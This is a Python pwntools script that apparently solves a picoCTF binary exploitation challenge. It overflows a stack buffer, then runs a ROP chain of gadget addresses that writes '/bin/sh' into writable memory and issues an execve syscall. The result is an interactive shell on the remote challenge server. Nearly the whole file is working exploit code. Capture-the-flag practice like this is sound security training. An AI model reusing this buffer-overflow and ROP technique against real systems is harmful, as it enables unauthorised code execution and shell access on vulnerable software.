# picoCTF-stack-cache-exploit.py
# by Aidan Wech (ahwech)
# nc saturn.picoctf.net xxxxx

from pwn import *

def main():
    # connection variables (remember to start up instance on picoCTF, port will vary!)
    host = "saturn.picoctf.net"
    port = 55618

    # variables
    offset = 14                             # length of buf + EBP
    pop_eax_then_edx_then_ebx = 0x0805ee98  # pop eax ; pop edx ; pop ebx ; ret
    mov_dword_ptr_edx_eax = 0x0805fbd2      # mov dword ptr [edx], eax ; ret
    xor_ecx_syscall = 0x0804a87f            # xor ecx, ecx ; syscall
    write_bin = 0x80e77c0                   # this is an address in '.data' that we can read from and write to
    write_sh = write_bin + 4

    payload = flat(
        cyclic(offset),

        # write "/bin" into memory
        p32(pop_eax_then_edx_then_ebx),
        "/bin",
        p32(write_bin),
        p32(0),
        p32(mov_dword_ptr_edx_eax),

        # write "/sh\x00" into memory
        p32(pop_eax_then_edx_then_ebx),
        "/sh\x00",
        p32(write_sh),
        p32(0),
        p32(mov_dword_ptr_edx_eax),

        # syscall
        p32(pop_eax_then_edx_then_ebx),
        p32(0xb),
        p32(0),
        p32(write_bin),
        p32(xor_ecx_syscall)
    )

    # connect to instance
    # if you are doing this locally, make sure that you have a file called "flag.txt" in your directory
    p = remote(host, port)

    # deliver payload
    p.recvline(timeout=1)
    p.sendline(payload)

    # interact with shell
    p.recvline(timeout=1)
    p.interactive()

if __name__ == "__main__":
    main()